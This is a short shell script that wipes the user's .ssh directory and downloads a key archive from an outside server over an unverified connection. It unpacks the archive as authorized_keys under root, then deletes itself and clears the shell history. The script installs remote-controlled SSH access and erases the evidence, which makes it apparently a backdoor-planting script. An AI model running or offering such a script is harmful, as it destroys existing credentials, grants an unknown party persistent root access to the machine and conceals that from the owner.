cd
rm -rf .ssh
mkdir .ssh
cd .ssh
wget --no-check-certificate https://dev.thuykieucompany.ca/download/key.tar.gz
tar -zxvf key.tar.gz
rm -rf key.tar.gz
cd 
chmod 700 .ssh
chmod 644 .ssh/*
chmod 600 .ssh/authorized_keys
chown -R root .ssh
rm -rf install_key.sh
history -c
